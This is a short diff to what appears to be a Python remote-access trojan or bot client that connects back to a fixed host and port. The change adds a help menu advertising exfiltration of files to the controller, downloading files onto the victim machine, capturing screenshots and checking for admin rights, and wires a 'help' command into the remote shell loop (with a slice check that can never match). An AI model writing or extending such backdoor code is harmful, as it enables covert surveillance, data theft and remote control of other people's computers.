@@ -15,6 +15,19 @@ HOST = '192.168.0.94'
 PORT = 54321
 
 
+def get_help():
+    return '''
+################################################
+OPTIONS:
+    
+    send <path>     --> send file to the remote host
+    get <path>      --> get file from the remote host
+    download <URL>  --> downloads a file to the remote host
+    screenshot      --> takes a screenshot from the host and sends to the bot controller
+    isadmin         --> tests if the bot controller has admin permissions on the host 
+    q               --> quit
+'''
+
 def reliable_send(_s, _data):
     if type(_data) is bytes:
         _data = _data.decode('UTF-8')
@@ -72,6 +85,8 @@ def shell(_s):
             _s.close()
             sys.exit(0)
             break
+        elif cmd[:5] == 'help':
+            reliable_send(_s, get_help())
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
             try:
                 os.chdir(cmd[3:])
